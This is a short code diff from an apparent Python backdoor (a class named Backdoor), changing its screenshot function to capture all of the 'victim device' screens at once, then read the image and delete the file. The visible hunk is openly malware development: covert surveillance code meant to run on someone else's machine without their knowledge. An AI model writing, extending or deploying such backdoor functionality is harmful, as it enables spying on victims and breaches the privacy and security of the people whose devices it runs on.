@@ -67,7 +67,7 @@ class Backdoor:
     def screenshot(self):
         # Screenshot whole screens of victim device
         with mss.mss() as scr:
-            scr.shot(output = 'screen.png')
+            scr.shot(mon = -1, output = 'screen.png')
             data = self.read_file('screen.png')
             if os.path.exists('screen.png'):
                 os.remove('screen.png')
